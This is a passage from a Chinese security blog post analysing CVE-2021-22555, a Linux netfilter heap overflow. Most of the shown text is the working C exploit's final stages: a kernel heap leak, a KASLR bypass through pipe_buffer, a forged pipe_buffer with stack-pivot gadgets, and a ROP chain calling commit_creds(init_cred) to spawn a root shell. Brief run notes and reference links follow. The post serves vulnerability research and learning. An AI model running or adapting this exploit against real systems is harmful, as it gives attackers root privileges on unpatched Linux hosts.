kheap_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kheap_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kheap_addr &amp; <span class="number">0xFFFF00000000FFFF</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel heap address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 3. leak kernel base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 3: KASLR bypass\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing fake secondary messages...\n&quot;</span>);</span><br><span class="line">  free_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3-1. forge `msg_msg-&gt;m_list-&gt;next &amp; prev` so that list_del() does not crash.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, kheap_addr, kheap_addr, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 3-2. free secondary msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing sk_buff data buffer...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), MTYPE_FAKE) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 3-3. spray pipe_buffer object</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] pipe&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Write something to populate pipe_buffer.</span></span><br><span class="line">    <span class="keyword">if</span> (write(pipefd[i][<span class="number">1</span>], <span class="string">&quot;pwn&quot;</span>, <span class="number">3</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] write&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 3-4. leak pipe_buffer-&gt;ops —— kernel base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking and freeing pipe_buffer object...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (read(ss[i][<span class="number">1</span>], secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] read&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_rmid;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)&amp;secondary_buf[<span class="number">0x10</span>] != MTYPE_FAKE)</span><br><span class="line">        pipe_buffer_ops = *(<span class="keyword">uint64_t</span> *)&amp;secondary_buf[<span class="number">0x10</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  kernel_offset = pipe_buffer_ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">  kbase_addr = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] anon_pipe_buf_ops: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, pipe_buffer_ops);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kbase_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kbase_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kbase_addr &amp; <span class="number">0xFFFF0000000FFFFF</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel base address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 4. hijack control-flow</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 4: Kernel code execution\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">// 4-1. use skb to forge fake pipe_buffer</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//hijack rsp</span></span><br><span class="line">  fake_pipe_buffer = (struct pipe_buffer *)&amp;secondary_buf;</span><br><span class="line">  fake_pipe_buffer-&gt;ops = kheap_addr;</span><br><span class="line">  </span><br><span class="line">  fake_pipe_buffer_ops = (struct pipe_buf_operations *)secondary_buf;</span><br><span class="line">  fake_pipe_buffer_ops-&gt;release = kernel_offset + PUSH_RSI_JMP_RSI_0x2E;                  <span class="comment">//</span></span><br><span class="line">  fake_pipe_buffer_ops-&gt;confirm = kernel_offset + ADD_RSP_0x98_RET;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> *mid_gadget;</span><br><span class="line">  mid_gadget = (<span class="keyword">uint64_t</span>*) (<span class="keyword">uint64_t</span>*) &amp;secondary_buf[<span class="number">0x2e</span>];</span><br><span class="line">  mid_gadget[<span class="number">0</span>] = kernel_offset + POP_RSP_RET;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4-2. construct ROP chain</span></span><br><span class="line">  <span class="comment">//build rop</span></span><br><span class="line">    <span class="keyword">int</span> rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span>*) &amp;secondary_buf[<span class="number">0xa0</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;PIG007XX&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;PIG007XX&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_eflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 4-3. trigger pipe_release()</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Releasing pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (close(pipefd[i][<span class="number">0</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] close&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (close(pipefd[i][<span class="number">1</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] close&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_rmid:</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == fake_idx)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (msgctl(msqid[i], IPC_RMID, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      perror(<span class="string">&quot;[-] msgctl&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">err_no_rmid:</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>效果：</p>
<p>中间有个<code>getchar()</code>，按下回车即可，本来放这是为了方便调试的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220515143144038.png" alt="image-20220515143144038"></p>
<p>不行的话可以多尝试几次</p>
<p>然后逃逸容器的我没尝试，也不太会，可以参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#FINAL-EXPLOIT" >arttnba3师傅的容器逃逸EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="参考"   >
          <a href="#参考" class="heading-link"><i class="fas fa-link"></i></a><a href="#参考" class="headerlink" title="参考"></a>参考</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027" >CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >【CVE.0x07】CVE-2021-22555 漏洞复现及简要分析 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html" >CVE-2021-22555: Turning \x00\x00 into 10000$ | security-research (google.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>太多了，有点贴不过来了….</p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/04/15/CVE-2021-22555_Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">http://pig-007.github.io/2022/04/15/CVE-2021-22555_Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/Kernel-CVE/">Kernel_CVE</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/07/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">JAVA反序列化CC链笔记</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/03/07/arp_spoof/"><span class="paginator-prev__text">arp_spoof</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">
          环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8%EF%BC%9A"><span class="toc-text">
          🔺注：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">
          前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-msg-msg%E7%BB%93%E6%9E%84%E4%BD%93%E2%80%94kmalloc-16%E8%87%B3kmalloc-1024"><span class="toc-text">
          1.msg_msg结构体—kmalloc-16至kmalloc-1024</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">
          (1)使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%9B%E5%BB%BA"><span class="toc-text">
          ①创建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93"><span class="toc-text">
          ②数据传输</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E9%87%8A%E6%94%BE"><span class="toc-text">
          ③释放</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">
          总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E4%B8%8E%E9%87%8A%E6%94%BE"><span class="toc-text">
          (2)内存分配与释放</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%9B%E5%BB%BA-1"><span class="toc-text">
          ①创建</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7"><span class="toc-text">
          A.内存申请</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-text">
          相关内存结构：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">
          内存申请总结：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6"><span class="toc-text">
          B.数据复制</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE"><span class="toc-text">
          ②释放</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E9%9D%9E%E5%A0%86%E5%9D%97%E9%87%8A%E6%94%BE%E7%9A%84%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%8F%96"><span class="toc-text">
          A.非堆块释放的数据读取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E9%87%8A%E6%94%BE%E5%A0%86%E5%9D%97%E7%9A%84%E6%B6%88%E6%81%AF%E8%AF%BB%E5%8F%96"><span class="toc-text">
          B.释放堆块的消息读取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#C-%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6"><span class="toc-text">
          C.数据复制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8"><span class="toc-text">
          (3)利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96"><span class="toc-text">
          越界读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96"><span class="toc-text">
          任意读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%86%99"><span class="toc-text">
          任意写</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-pipe%E7%AE%A1%E9%81%93%E2%80%94kmalloc-1024-kmalloc-192"><span class="toc-text">
          2.pipe管道—kmalloc-1024&#x2F;kmalloc-192</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="toc-text">
          (1)使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%9B%E5%BB%BA-2"><span class="toc-text">
          ①创建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE-1"><span class="toc-text">
          ②释放</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E4%B8%8E%E9%87%8A%E6%94%BE-1"><span class="toc-text">
          (2)内存分配与释放</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%86%E9%85%8D"><span class="toc-text">
          ①分配</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE-2"><span class="toc-text">
          ②释放</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8-1"><span class="toc-text">
          (3)利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">
          ①信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81"><span class="toc-text">
          ②劫持程序流</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-sk-buff%E2%80%94kmalloc-512%E5%8F%8A%E4%BB%A5%E4%B8%8A"><span class="toc-text">
          3.sk_buff—kmalloc-512及以上</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-2"><span class="toc-text">
          (1)使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%9B%E5%BB%BA-3"><span class="toc-text">
          ①创建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE-3"><span class="toc-text">
          ②释放</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E4%B8%8E%E9%87%8A%E6%94%BE-2"><span class="toc-text">
          (2)内存分配与释放</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%86%E9%85%8D-1"><span class="toc-text">
          ①分配</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7-1"><span class="toc-text">
          A.内存申请</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7%E6%80%BB%E7%BB%93%EF%BC%9A-1"><span class="toc-text">
          内存申请总结：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6-1"><span class="toc-text">
          B.数据复制</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE-4"><span class="toc-text">
          ②释放</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6"><span class="toc-text">
          A.数据复制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E5%86%85%E5%AD%98%E9%87%8A%E6%94%BE"><span class="toc-text">
          B.内存释放</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%87%8A%E6%94%BE%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">
          内存释放总结：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">
          一、漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-nf-setsockopt"><span class="toc-text">
          1.nf_setsockopt()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-do-ipt-set-ctl"><span class="toc-text">
          2.do_ipt_set_ctl()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-compat-do-replace"><span class="toc-text">
          3.compat_do_replace()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-translate-compat-table"><span class="toc-text">
          4.translate_compat_table()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-compat-copy-entry-from-user"><span class="toc-text">
          5.compat_copy_entry_from_user()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-xt-compat-match-from-user"><span class="toc-text">
          6.xt_compat_match_from_user()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-xt-compat-target-from-user"><span class="toc-text">
          6.xt_compat_target_from_user()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-text">
          总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8E%A7%E5%88%B6%E5%A0%86%E5%9D%97%E5%A4%A7%E5%B0%8F%E5%92%8C%E5%81%8F%E7%A7%BB"><span class="toc-text">
          (1)控制堆块大小和偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8E%A7%E5%88%B6%E5%A1%AB%E5%85%85pad"><span class="toc-text">
          (2)控制填充pad</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">
          二、漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BA%A2%E5%87%BA%E8%BD%AC%E5%8C%96UAF"><span class="toc-text">
          1.溢出转化UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A0%86%E5%96%B7%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="toc-text">
          (1)堆喷内存布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%BA%A2%E5%87%BA%E6%9E%84%E9%80%A0UAF"><span class="toc-text">
          (2)漏洞溢出构造UAF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8UAF"><span class="toc-text">
          2.利用UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9C%B0%E5%9D%80"><span class="toc-text">
          (1)泄露堆地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B3%84%E9%9C%B2%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-text">
          (2)泄露内核基地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-text">
          (3)劫持程序执行流</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-EXP%E8%A7%A3%E6%9E%90"><span class="toc-text">
          3.EXP解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BB%91%E5%AE%9ACPU%E5%88%86%E9%85%8D"><span class="toc-text">
          (1)绑定CPU分配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="toc-text">
          (2)命名空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9C%80%E7%BB%88EXP"><span class="toc-text">
          (3)最终EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">
          参考</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">122</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">68</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">64</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

